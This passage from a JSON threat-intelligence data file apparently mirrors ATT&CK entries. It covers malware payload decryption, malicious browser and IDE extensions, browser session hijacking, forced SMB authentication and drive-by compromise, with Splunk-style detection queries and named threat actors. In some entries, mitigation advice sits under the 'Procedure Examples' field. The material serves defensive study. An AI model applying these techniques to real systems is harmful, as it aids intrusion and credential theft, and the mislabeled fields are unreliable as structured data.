      "SampleCheck5000can decode and decrypt command line strings and files received through C2.[148][206]",
      "Sandworm Team's VBS backdoor can decode Base64-encoded data and save it to the %TEMP% folder. The group also decrypted received information using the Triple DES algorithm and decompresses it using GZip.[266][267]",
      "Sardoniccan first decrypt with the RC4 algorithm using a hardcoded decryption key before decompressing.[268]",
      "SDBbothas the ability to decrypt and decompress its payload to enable code execution.[269][270]",
      "ShadowPadhas decrypted a binary blob to start execution.[271]",
      "Shamoondecrypts ciphertext using an XOR cipher and a base64-encoded string.[272]",
      "Sharkcan extract and decrypt downloaded .zip files.[273]",
      "SharpStagehas decompressed data received from the C2 server.[274]",
      "ShimRathas decompressed its core DLL using shellcode once an impersonated antivirus component was running on a system.[275]",
      "Sibotcan decrypt data received from a C2 and save to a file.[121]",
      "SideTwistcan decode and decrypt messages received from C2.[276]",
      "Siloscapehas decrypted the password of the C2 server with a simple byte by byte XOR.Siloscapealso writes both an archive ofTorand theunzipbinary to disk from data embedded within the payload using Visual Studio’s Resource Manager.[277]",
      "Skidmaphas the ability to download, unpack, and decrypt tar.gz files .[278]",
      "SLIGHTPULSEcan deobfuscate base64 encoded and RC4 encrypted C2 messages.[279]",
      "Smoke Loaderdeobfuscates its code.[280]",
      "Snip3can decode its second-stage PowerShell script prior to execution.[281]",
      "During theSolarWinds Compromise,APT29used 7-Zip to decode theirRaindropmalware.[241]",
      "SombRATcan runuploadto decrypt and upload files from storage.[77][112]",
      "SoreFangcan decode and decrypt exfiltrated data sent to C2.[282]",
      "Sparkhas used a custom XOR algorithm to decrypt the payload.[283]",
      "Upon executionSpicacan decode an embedded .pdf and write it to the desktop as a decoy document.[284]",
      "SQLRathas scripts that are responsible for deobfuscating additional scripts.[285]",
      "Squirrelwafflehas decrypted files and payloads using a XOR-based algorithm.[286][287]",
      "Starloaderdecrypts and executes shellcode from a file called Stars.jps.[288]",
      "STEADYPULSEcan URL decode key/value pairs sent over C2.[279]",
      "StealBitcan deobfuscate loaded modules prior to execution.[169][289]",
      "Storm-1811has distributed password-protected archives such as ZIP files during intrusions.[290]",
      "StrelaStealerpayloads have included strings encrypted via XOR.[291]StrelaStealerJavaScript payloads utilize Base64-encoded payloads that are decoded viacertutilto create a malicious DLL file.[292][293]",
      "Stuxnetdecrypts resources that are loaded into memory and executed.[294]",
      "SUNSPOTdecryptsSUNBURST, which was stored in AES128-CBC encrypted blobs.[295]",
      "SysUpdatecan deobfuscate packed binaries in memory.[139]",
      "TA505has decrypted packed DLLs with an XOR key.[296]",
      "Taidoorcan use a stream cipher to decrypt stings used by the malware.[297]",
      "TeamTNThas used a script that decodes a Base64-encoded version of WeaveWorks Scope.[298]",
      "TEARDROPwas decoded using a custom rolling XOR algorithm to execute a customizedCobalt Strikepayload.[299][300][242]",
      "During execution,Threat Group-3390malware deobfuscates and decompresses code that was encoded with Metasploit’s shikata_ga_nai encoder as well as compressed with LZNT1 compression.[301]",
      "ThreatNeedlecan decrypt its payload using RC4, AES, or one-byte XORing.[302]",
      "Torismahas used XOR and Base64 to decode C2 data.[303]",
      "TrickBotdecodes the configuration data and modules.[304][305][306]",
      "Tropic Trooperused shellcode with an XOR algorithm to decrypt a payload.Tropic Trooperalso decrypted image files which contained a payload.[307][308]",
      "TSCookiehas the ability to decrypt, load, and execute a DLL and its resources.[309]",
      "Turianhas the ability to use a XOR decryption key to extract C2 server domains and IP addresses.[310]",
      "Turlahas used a custom decryption routine, which pulls key and salt values from other artifacts such as a WMI filter orPowerShell Profile, to decode encrypted PowerShell payloads.[311]",
      "OneTYPEFRAMEvariant decrypts an archive using an RC4 key, then decompresses and installs the decrypted malicious DLL module. Another variant decodes the embedded file by XORing it with the value \"0x35\".[312]",
      "UPSTYLEencodes its main content prior to loading via Python as base64-encoded blobs.[313][314]",
      "Uroburoscan decrypt command parameters sent through C2 and use unpacking code to extract its packed executable.[315]",
      "Ursnifhas used crypto key information stored in the Registry to decrypt Tor clients dropped to disk.[316]",
      "Valakhas the ability to decode and decrypt downloaded files.[317][318]",
      "VaporRagecan deobfuscate XOR-encoded shellcode prior to execution.[44]",
      "VERMINdecrypts code, strings, and commands to use once it's on the victim's machine.[319]",
      "Volgmerdeobfuscates its strings and APIs once its executed.[320]",
      "Volt Typhoonhas used Base64-encoded data to transfer payloads and commands, including deobfuscation viacertutil.[321]",
      "WarzoneRATcan use XOR 0x45 to decrypt obfuscated code.[322]",
      "WastedLocker's custom cryptor, CryptOne, used an XOR based algorithm to decrypt the payload.[323]",
      "Water Curupira Pikabot Distributionused highly obfuscated JavaScript files as one initial installer forPikabot.[324]",
      "Waterbearhas the ability to decrypt its RC4 encrypted payload for execution.[325]",
      "WellMailcan decompress scripts received from C2.[326]",
      "WellMesscan decode and decrypt data received from C2.[327][328][329]",
      "WhisperGatecan deobfuscate downloaded files stored in reverse byte order and decrypt embedded resources using multiple XOR operations.[330][331]",
      "WindTailhas the ability to decrypt strings using hard-coded AES keys.[332]",
      "Winnti for Linuxhas decoded XOR encoded strings holding its configuration upon execution.[333]",
      "TheWinnti for Windowsdropper can decrypt and decompresses a data blob.[334]",
      "Winter Viverndelivered exploit payloads via base64-encoded payloads in malicious email messages.[335]",
      "WIREFIREcan decode, decrypt, and decompress data received in C2 HTTPPOSTrequests.[336]",
      "WIRTEhas used Base64 to decode malicious VBS script.[337]",
      "Woody RATcan deobfuscate Base64-encoded strings and scripts.[338]",
      "xCaonhas decoded strings from the C2 server before executing commands.[339]",
      "XLoaderuses XOR and RC4 algorithms to decrypt payloads and functions.[340]XLoadercan be distributed as a self-extracting RAR archive that launches an AutoIT loader.[341]",
      "YAHOYAHdecrypts downloaded files before execution.[342]",
      "Zebrocydecodes its secondary payload and writes it to the victim’s machine.Zebrocyalso uses AES and XOR to decrypt strings and payloads.[343][344]",
      "ZeroTshellcode decrypts and decompresses its RC4-encrypted payload.[345]",
      "Zeus Pandadecrypts strings in the code during the execution process.[346]",
      "ZIRCONIUMhas used the AES256 algorithm with a SHA1 derived key to decrypt exploit code.[347]",
      "ZxxZhas used a XOR key to decrypt strings.[348]"
    ]
  },
  "T1176": {
    "Name": "Software Extensions",
    "Description": "Adversaries may abuse software extensions to establish persistent access to victim systems. Software extensions are modular components that enhance or customize the functionality of software applications, including web browsers, Integrated Development Environments (IDEs), and other platforms.[1][2]Extensions are typically installed via official marketplaces, app stores, or manually loaded by users, and they often inherit the permissions and access levels of the host application.Malicious extensions can be introduced through various methods, including social engineering, compromised marketplaces, or direct installation by users or by adversaries who have already gained access to a system. Malicious extensions can be named similarly or identically to benign extensions in marketplaces. Security mechanisms in extension marketplaces may be insufficient to detect malicious components, allowing adversaries to bypass automated scanners or exploit trust established during the installation process. Adversaries may also abuse benign extensions to achieve their objectives, such as using legitimate functionality to tunnel data or bypass security controls.The modular nature of extensions and their integration with host applications make them an attractive target for adversaries seeking to exploit trusted software ecosystems. Detection can be challenging due to the inherent trust placed in extensions during installation and their ability to blend into normal application workflows.",
    "Detects": [
      "Monitor executed commands and arguments for usage of the profiles tool, such asprofiles install -type=configuration.",
      "Monitor for newly constructed files in directories associated with software extensions. Ensure all listed files are in alignment with approved extensions",
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts.",
      "Monitor for network traffic directed towards software services from servers or network zones that should not be communicating with this service.",
      "Monitor for processes associated with extension-capable software on servers where they should not be running.",
      "Monitor for any new items written to the Registry or PE files written to disk. That may correlate with extension installation."
    ],
    "Procedure Examples": [
      "Ensure extensions that are installed are the intended ones, as many malicious extensions may masquerade as legitimate ones.",
      "Set an extension allow or deny list as appropriate for your security policy.",
      "Only install extensions from trusted sources that can be verified.",
      "Ensure operating systems and software are using the most current version.",
      "Train users to minimize extension use, and to only install trusted extensions."
    ]
  },
  "T1176.001": {
    "Name": "Software Extensions:Browser Extensions",
    "Description": "Adversaries may abuse internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality to and customize aspects of internet browsers. They can be installed directly via a local file or custom URL or through a browser's app store - an official online platform where users can browse, install, and manage extensions for a specific web browser. Extensions generally inherit the web browser's permissions previously granted.[1][2]Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores, so it may not be difficult for malicious extensions to defeat automated scanners.[3]Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary-controlled server or manipulate the mobile configuration file to silently install additional extensions.Previous to macOS 11, adversaries could silently install browser extensions via the command line using theprofilestool to install malicious.mobileconfigfiles. In macOS 11+, the use of theprofilestool can no longer install configuration profiles; however,.mobileconfigfiles can be planted and installed with user interaction.[4]Once the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.[5][6][7][8]There have also been instances of botnets using a persistent backdoor through malicious Chrome extensions forCommand and Control.[9][10]Adversaries may also use browser extensions to modify browser permissions and components, privacy settings, and other security controls forDefense Evasion.[11][12]",
    "Detects": [
      "Monitor executed commands and arguments for usage of the profiles tool, such asprofiles install -type=configuration.Analytic 1 - Look for command-line activity tied to mobileconfig or extension deploymentsourctype=WinEventLog:Sysmon EventCode=1(CommandLine=\"profiles install\" OR CommandLine=\".mobileconfig\" OR CommandLine=\"chrome-extension\")| stats count by CommandLine, Image, ParentImage, User, Computer, _time| sort -_time",
      "Monitor for - Newly written .crx, .xpi, or .mobileconfig files- Modified .plist files under /Library/Managed Preferences// (macOS)- Creation of extensions under:    - Chrome: AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions    - Firefox: %APPDATA%\\Mozilla\\Firefox\\Profiles*.default\\extensionsAnalytic 1 - Detect newly written config filessourcetype=WinEventLog:Sysmon EventCode=11(TargetFilename=\"\\Extensions\\\" OR TargetFilename=\".crx\" OR TargetFilename=\".xpi\" OR TargetFilename=\"*.mobileconfig\")| stats count by TargetFilename, Image, User, Computer, _time| sort -_time",
      "Monitor for newly constructed network connections that are sent or received by untrusted hosts.",
      "Monitor for execution of chrome.exe, firefox.exe, or edge.exe with arguments like --load-extension, --pack-extension, or --disable-extensions-file-access-check.Monitor unexpected command-line installs or dev mode extensionsAnalytic 1 - browser executionsourcetype=WinEventLog:Sysmon EventCode=1(CommandLine=\"--load-extension\" OR CommandLine=\"--pack-extension\")| stats count by Image, CommandLine, User, host, _time| sort -_time",
      "Monitor for any new items written to the Registry or PE files written to disk. That may correlate with browser extension installation.Chrome extension registry keys under: HKCU\\Software\\Google\\Chrome\\ExtensionsFirefox entries under: HKCU\\Software\\Mozilla\\Firefox\\ExtensionsUnexpected changes or new GUIDsAnalytic 1 - browser registry keys createdsourcetype=WinEventLog:Sysmon EventCode=13(TargetObject=\"\\Software\\Google\\Chrome\\Extensions\\\" OR TargetObject=\"\\Software\\Mozilla\\Firefox\\Extensions\\\")| stats count by TargetObject, Details, User, Computer, _time| sort -_time"
    ],
    "Procedure Examples": [
      "Bundlorecan install malicious browser extensions that are used to hijack user searches.[13]",
      "Grandoreirocan use malicious browser extensions to steal cookies and other user information.[14]",
      "Kimsukyhas used Google Chrome browser extensions to infect victims and to steal passwords and cookies.[15][16]",
      "Lumma Stealerhas installed a malicious browser extension to target Google Chrome, Microsoft Edge, Opera and Brave browsers for the purpose of stealing data.[17]",
      "Mispaduutilizes malicious Google Chrome browser extensions to steal financial data.[18]",
      "OSX/Shlayercan install malicious Safari browser extensions to serve ads.[19][20]",
      "TRANSLATEXThas the ability to capture credentials, cookies, browser screenshots, etc. and to exfiltrate data.[21]"
    ]
  },
  "T1176.002": {
    "Name": "Software Extensions:IDE Extensions",
    "Description": "Adversaries may abuse an integrated development environment (IDE) extension to establish persistent access to victim systems.[1]IDEs such as Visual Studio Code, IntelliJ IDEA, and Eclipse support extensions - software components that add features like code linting, auto-completion, task automation, or integration with tools like Git and Docker. A malicious extension can be installed through an extension marketplace (i.e.,Compromise Software Dependencies and Development Tools) or side-loaded directly into the IDE.[2][3]In addition to installing malicious extensions, adversaries may also leverage benign ones. For example, adversaries may establish persistent SSH tunnels via the use of the VSCode Remote SSH extension (i.e.,IDE Tunneling).Trust is typically established through the installation process; once installed, the malicious extension is run every time that the IDE is launched. The extension can then be used to execute arbitrary code, establish a backdoor, mine cryptocurrency, or exfiltrate data.[4]",
    "Detects": [
      "Monitor for network traffic directed towards IDE services, such asglobal.rel.tunnels.api.visualstudio.com, from servers or network zones that should not be communicating with this service.[1]Analytic 1 - suspicious network connectionssourcetype=zeek:conn_log OR sourcetype=zeek:http_log OR sourcetype=suricata_flow(host=\".tunnels.api.visualstudio.com\" OR host=\".jetbrains.com\")| lookup endpoint_asset_zones ip AS src_ip OUTPUT zone| where zone=\"prod\" OR zone=\"non-dev\"| stats count by src_ip, dest_ip, host, uri_path, http_method, zone, _time| sort -_time",
      "Monitor for Unexpected launches of IDEs (code.exe, idea64.exe, eclipse, jetbrains-gateway) especially on servers or non-dev endpoints.Execution of these binaries with suspicious flags (--install-extension, --force, --disable-extensions).Parent processes not commonly associated with developer workflows (e.g., cmd.exe, powershell.exe, or unknown binaries).Analytic 1 - suspicious process executionssourcetype=WinEventLog:Sysmon EventCode=1(Image=\"\\code.exe\" OR Image=\"\\idea64.exe\" OR Image=\"\\eclipse.exe\" OR Image=\"\\jetbrains-gateway.exe\")| eval is_unexpected_host=if(like(Computer, \"%server%\") OR like(Computer, \"%prod%\"), \"yes\", \"no\")| stats count by Image, CommandLine, ParentImage, User, Computer, is_unexpected_host, _time| where is_unexpected_host=\"yes\"| sort -_time"
    ],
    "Procedure Examples": [
      "Ensure extensions that are installed are the intended ones, as many malicious extensions may masquerade as legitimate ones.",
      "Set an IDE extension allow or deny list as appropriate for your security policy.",
      "Only install IDE extensions from trusted sources that can be verified.",
      "Ensure operating systems and IDEs are using the most current version.",
      "Train users to minimize IDE extension use, and to only install trusted extensions."
    ]
  },
  "T1185": {
    "Name": "Browser Session Hijacking",
    "Description": "Adversaries may take advantage of security vulnerabilities and inherent functionality in browser software to change content, modify user-behaviors, and intercept information as part of various browser session hijacking techniques.[1]A specific example is when an adversary injects software into a browser that allows them to inherit cookies, HTTP sessions, and SSL client certificates of a user then use the browser as a way to pivot into an authenticated intranet.[2][3]Executing browser-based behaviors such as pivoting may require specific process permissions, such asSeDebugPrivilegeand/or high-integrity/administrator rights.Another example involves pivoting browser traffic from the adversary's browser through the user's browser by setting up a proxy which will redirect web traffic. This does not alter the user's traffic in any way, and the proxy connection can be severed as soon as the browser is closed. The adversary assumes the security context of whichever browser process the proxy is injected into. Browsers typically create a new process for each tab that is opened and permissions and certificates are separated accordingly. With these permissions, an adversary could potentially browse to any resource on an intranet, such asSharepointor webmail, that is accessible through the browser and which the browser has sufficient permissions. Browser pivoting may also bypass security provided by 2-factor authentication.[4]",
    "Detects": [
      "Authentication logs can be used to audit logins to specific web applications, but determining malicious logins versus benign logins may be difficult if activity matches typical user behavior.",
      "This may be a difficult technique to detect because adversary traffic may be masked by normal user traffic. Monitor forProcess Injectionagainst browser applications.",
      "This may be a difficult technique to detect because adversary traffic may be masked by normal user traffic. Monitor forProcess Injectionagainst browser applications."
    ],
    "Procedure Examples": [
      "Agent Teslahas the ability to use form-grabbing to extract data from web data forms.[5]",
      "Carberphas captured credentials when a user performs login through a SSL session.[6][7]",
      "Chaeshas used the Puppeteer module to hook and monitor the Chrome web browser to collect user information from infected hosts.[8]",
      "Cobalt Strikecan perform browser pivoting and inject into a user's browser to inherit cookies, authenticated HTTP sessions, and client SSL certificates.[4][9]",
      "Dridexcan perform browser attacks via web injects to steal information such as credentials, certificates, and cookies.[10]",
      "Grandoreirocan monitor browser activity for online banking actions and display full-screen overlay images to block user access to the intended site or present additional data fields.[11][12][13]",
      "IcedIDhas used web injection attacks to redirect victims to spoofed sites designed to harvest banking and other credentials.IcedIDcan use a self signed TLS certificate in connection with the spoofed site and simultaneously maintains a live connection with the legitimate site to display the correct URL and certificates in the browser.[14][15]",
      "Kimsukyhas the ability to use form-grabbing to extract emails and passwords from web data forms.[16]",
      "Melcozcan monitor the victim's browser for online banking sessions and display an overlay window to manipulate the session in the background.[11]",
      "QakBotcan use advanced web injects to steal web banking credentials.[17][18]",
      "TRANSLATEXThas the ability to use form-grabbing and event-listening to extract data from web data forms.[16]",
      "TrickBotuses web injects and browser redirection to trick the user into providing their login credentials on a fake or modified web page.[19][20][21][22]",
      "Ursnifhas injected HTML codes into banking sites to steal sensitive online banking information (ex: usernames and passwords).[23]",
      "XLoadercan conduct form grabbing, steal cookies, and extract data from HTTP sessions.[24]"
    ]
  },
  "T1187": {
    "Name": "Forced Authentication",
    "Description": "Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system.[1]This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443.[2][3]Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e.Template Injection), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server.[4]With access to the credential hash, an adversary can perform off-lineBrute Forcecracking to gain access to plaintext credentials.[5]There are several different ways this can occur.[6]Some specifics from in-the-wild use include:A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e.Template Injection). The document can include, for example, a request similar tofile[:]//[remote address]/Normal.dotmto trigger the SMB request.[7]A modified .LNK or .SCF file with the icon filename pointing to an external reference such as\\[remote address]\\pic.pngthat will force the system to load the resource when the icon is rendered to repeatedly gather credentials.[7]",
    "Detects": [
      "Monitor for access to files that may indicate attempts to coerce a user into providing authentication information.Analytic 1 - Suspicious access to files known to be used for forced authentication attacks.index=security sourcetype=\"WinEventLog:Security\" EventCode=4663 ObjectName=\"\\path\\to\\suspicious\\file\" | where match(ObjectName, \"(?i)\\(.*\\.)?(lnk|scf|url|doc|dot|xls|ppt|pdf|scf|html)$\")",
      "Monitor for newly constructed .LNK, .SCF, or any other files on systems and within virtual environments that contain resources that point to external network resources.Analytic 1 - Creation of suspicious files in locations used for forced authentication attacks.(index=security sourcetype=\"WinEventLog:Security\" EventCode=4663) OR (index=sysmon sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=11) | where match(ObjectName, \"(?i)\\(.*\\.)?(lnk|scf|url|doc|dot|xls|ppt|pdf|html)$\")| where match(ObjectName, \"(?i)(desktop|public|downloads|temp|cache|start menu|startup)\")",
      "Monitor for changes made to the .LNK, .SCF, or any other files on systems and within virtual environments that contain resources that point to external network resources.Analytic 1 - Modifications to files known to be used for forced authentication attacks.(index=security sourcetype=\"WinEventLog:Security\" EventCode=4663)  | where match(ObjectName, \"(?i)\\(.*\\.)?(lnk|scf|url|doc|dot|xls|ppt|pdf|html)$\")| where match(ObjectName, \"(?i)(desktop|public|downloads|temp|cache|start menu|startup)\")",
      "For internal traffic, monitor the workstation-to-workstation unusual (vs. baseline) SMB traffic. For many networks there should not be any, but it depends on how systems on the network are configured and where resources are located.Analytic 1 - Detection of NTLM hash traffic or other suspicious authentication traffic.index=network sourcetype=\"stream:tcp\" (dest_port=445 OR dest_port=80 OR dest_port=443) | eval Protocol=case(dest_port==445, \"SMB\", dest_port==80, \"HTTP\", dest_port==443, \"HTTPS\", true(), \"Unknown\")| search (command IN (\"NTLMSSP_NEGOTIATE\", \"NTLMSSP_AUTH\")) | eval SuspiciousAuth=case(    match(_raw, \"NTLMSSP_NEGOTIATE\"), \"NTLM Negotiate\",    match(_raw, \"NTLMSSP_AUTH\"), \"NTLM Authentication\",    true(), \"Unknown\")",
      "Monitor for SMB traffic on TCP ports 139, 445 and UDP port 137 and WebDAV traffic attempting to exit the network to unknown external systems.If attempts are detected, then investigate endpoint data sources to find the root cause.Analytic 1 - Unusual network traffic patterns indicative of forced authentication attempts.index=network sourcetype=\"stream:tcp\" (dest_port=445 OR dest_port=80 OR dest_port=443)| eval Protocol=case(dest_port==445, \"SMB\", dest_port==80, \"HTTP\", dest_port==443, \"HTTPS\", true(), \"Unknown\")| eval SuspiciousConn=if((Protocol=\"SMB\" AND src_ip!=dest_ip AND (src_ip!=\"known_ip1\" AND dest_ip!=\"known_ip2\")), 1, 0)| where SuspiciousConn=1"
    ],
    "Procedure Examples": [
      "DarkHydrususedTemplate Injectionto launch an authentication window for users to enter their credentials.[8]",
      "Dragonflyhas gathered hashed user credentials over SMB using spearphishing attachments with external resource links and by modifying .LNK file icon resources to collect credentials from virtualized systems.[9][10]",
      "EnvyScoutcan use protocol handlers to coax the operating system to send NTLMv2 authentication responses to attacker-controlled infrastructure.[11]"
    ]
  },
  "T1189": {
    "Name": "Drive-by Compromise",
    "Description": "Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. Multiple ways of delivering exploit code to a browser exist (i.e.,Drive-by Target), including:A legitimate website is compromised, allowing adversaries to inject malicious codeScript files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversaryMalicious ads are paid for and served through legitimate ad providers (i.e.,Malvertising)Built-in web application interfaces that allow user-controllable content are leveraged for the insertion of malicious scripts or iFrames (e.g., cross-site scripting)Browser push notifications may also be abused by adversaries and leveraged for malicious code injection viaUser Execution. By clicking \"allow\" on browser push notifications, users may be granting a website permission to run JavaScript code on their browser.[1][2][3]Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or a particular region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.[4]Typical drive-by compromise process:A user visits a website that is used to host the adversary controlled content.Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. The user may be required to assist in this process by enabling scripting, notifications, or active website components and ignoring warning dialog boxes.Upon finding a vulnerable version, exploit code is delivered to the browser.If exploitation is successful, the adversary will gain code execution on the user's system unless other protections are in place. In some cases, a second visit to the website after the initial scan is required before exploit code is delivered.UnlikeExploit Public-Facing Application, the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.",
    "Detects": [
      "Firewalls and proxies can inspect URLs for potentially known-bad domains or parameters. They can also do reputation-based analytics on websites and their requested resources such as how old a domain is, who it's registered to, if it's on a known bad list, or how many other users have connected to it before.",
      "Monitor for newly constructed files written to disk to gain access to a system through a user visiting a website over the normal course of browsing. Detect browser process dropping files in suspicious locations (AppData, Temp,/tmp,/var/tmp). Identify exploit payloads (DLLs, JavaScript, shell scripts) written by the browser process.(sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=11 Image=\"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" OR Image=\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\")OR (sourcetype=\"/var/log/audit/audit.log\" SYSCALL=\"open\" path=\"/tmp/%\" process=\"firefox\" OR process=\"chrome\")| eval risk_score = case(    like(path, \"%\\Temp\\%\"), 5,    like(path, \"%AppData%\"), 4,    like(path, \"%/var/tmp%\"), 6)| where risk_score >= 5| table _time, host, process, path, risk_score",
      "Monitor for newly constructed network connections to untrusted hosts that are used to send or receive data. Identify browser processes initiating connections to known malicious domains.Detect browser requests to suspicious IPs or domains classified under newly registered domains.Look for anomalous DNS queries and HTTP request patterns.(sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=3 process=\"chrome.exe\" OR process=\"firefox.exe\")OR (source=\"cloud_dns_logs\" category=\"newly_registered_domain\")OR (source=\"/var/log/zeek/conn.log\" dest_ip IN (malicious_ip_list))| stats count by src_ip, dest_ip, domain, process| where count > 5",
      "Detect suspicious script execution over HTTP/S. Identify JavaScript payloads with obfuscation or encoded execution. Look for exploit attempts in network payloads.(EventCode=5156 dest_port=80 OR dest_port=443 process=\"chrome.exe\" OR process=\"firefox.exe\")OR (source=\"/var/log/zeek/http.log\" method=\"GET\" uri IN (suspicious_js_files))| stats count by src_ip, dest_ip, uri, user_agent| where count > 3",
      "Look for behaviors on the endpoint system that might indicate successful compromise, such as abnormal behaviors of browser processes. This could include suspicious files written to disk, evidence ofProcess Injectionfor attempts to hide execution, or evidence of Discovery."
    ],
    "Procedure Examples": [
      "Andarielhas used watering hole attacks, often with zero-day exploits, to gain initial access to victims within a specific IP range.[5][6]",
      "APT19performed a watering hole attack on forbes.com in 2014 to compromise targets.[7]",
      "APT28has compromised targets via strategic web compromise utilizing custom exploit kits.[8]APT28used reflected cross-site scripting (XSS) against government websites to redirect users to phishing webpages.[9]",
      "APT32has infected victims by tricking them into visiting compromised watering hole websites.[10][11]",
      "APT37has used strategic web compromises, particularly of South Korean websites, to distribute malware. The group has also used torrent file-sharing sites to more indiscriminately disseminate malware to victims. As part of their compromises, the group has used a Javascript based profiler called RICECURRY to profile a victim's web browser and deliver malicious code accordingly.[12][13][14]",
      "APT38has conducted watering holes schemes to gain initial access to victims.[15][16]",
      "Axiomhas used watering hole attacks to gain access.[17]",
      "Bad Rabbitspread through watering holes on popular sites by injecting JavaScript into the HTML body or a.jsfile.[18][19]",
      "BRONZE BUTLERcompromised three Japanese websites using a Flash exploit to perform watering hole attacks.[20]",
      "Bundlorehas been spread through malicious advertisements on websites.[21]",
      "DuringC0010, UNC3890 actors likely established a watering hole that was hosted on a login page of a legitimate Israeli shipping company that was active until at least November 2021.[22]",
      "CURIUMhas used strategic website compromise to infect victims with malware such asIMAPLoader.[23]",
      "Daggerflyhas used strategic website compromise for initial access against victims.[24]",
      "Dark Caracalleveraged a watering hole to serve up malicious code.[25]",
      "Darkhotelused embedded iframes on hotel login portals to redirect selected victims to download malware.[26]",
      "Dragonflyhas compromised targets via strategic web compromise (SWC) utilizing a custom exploit kit.[27][28][29]",
      "Earth Luscahas performed watering hole attacks.[30]",
      "Elderwoodhas delivered zero-day exploits and malware to victims by injecting malicious code into specific public Web pages visited by targets within a particular sector.[31][32][33]",
      "Grandoreirohas used compromised websites and Google Ads to bait victims into downloading its installer.[34][35]",
      "IcedIDhas cloned legitimate websites/applications to distribute the malware.[36]",
      "KARAEwas distributed through torrent file-sharing websites to South Korean victims, using a YouTube video downloader application as a lure.[13]",
      "Lazarus GroupdeliveredRATANKBAand other malicious code to victims via a compromised legitimate website.[37][38]",
      "Leafminerhas infected victims using watering holes.[39]",
      "Leviathanhas infected victims using watering holes.[40]",
      "LoudMineris typically bundled with pirated copies of Virtual Studio Technology (VST) for Windows and macOS.[41]",
      "Machetehas distributedMachetethrough a fake blog website.[42]",
      "Magic Houndhas conducted watering-hole attacks through media and magazine websites.[43]",
      "Mustard Tempesthas used drive-by downloads for initial infection, often using fake browser updates as a lure.[44][45][46][47]",
      "DuringOperation Dust Storm, the threat actors used a watering hole attack on a popular software reseller to exploit the then-zero-day Internet Explorer vulnerability CVE-2014-0322.[48]",
      "Patchworkhas used watering holes to deliver files with exploits to initial victims.[49][50]",
      "PLATINUMhas sometimes used drive-by attacks against vulnerable browser plugins.[51]",
      "POORAIMhas been delivered through compromised sites acting as watering holes.[13]",
      "PROMETHIUMhas used watering hole attacks to deliver malicious versions of legitimate installers.[52]",
      "REvilhas infected victim machines through compromised websites and exploit kits.[53][54][55][56]",
      "RTMhas distributed its malware via the RIG and SUNDOWN exploit kits, as well as online advertising networkYandex.Direct.[57][58]",
      "Snip3has been delivered to targets via downloads from malicious domains.[59]",
      "SocGholishhas been distributed through compromised websites with malicious content often masquerading as browser updates.[44]",
      "Threat Group-3390has extensively used strategic web compromises to target victims.[60][61]",
      "Transparent Tribehas used websites with malicious hyperlinks and iframes to infect targeted victims withCrimson,njRAT, and other malicious tools.[62][63][64]",
      "Turlahas infected victims using watering holes.[65][66]",
      "Windigohas distributed Windows malware via drive-by downloads.[67]",
      "Windshifthas used compromised websites to register custom URL schemes on a remote system.[68]",
      "Winter Viverncreated dedicated web pages mimicking legitimate government websites to deliver malicious fake anti-virus software.[69]"
    ]
  },
  "T1190": {
    "Name": "Exploit Public-Facing Application",
    "Description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.Exploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet-accessible open sockets.[1][2][3][4][5]On ESXi infrastructure, adversaries may exploit exposed OpenSLP services; they may alternatively exploit exposed VMware vCenter servers.[6][7]Depending on the flaw being exploited, this may also involveExploitation for Defense EvasionorExploitation for Client Execution.If an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs (e.g., via theCloud Instance Metadata API), exploit container host access viaEscape to Host, or take advantage of weak identity and access management policies.Adversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.[8][9]For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.[10][11]",
    "Detects": [
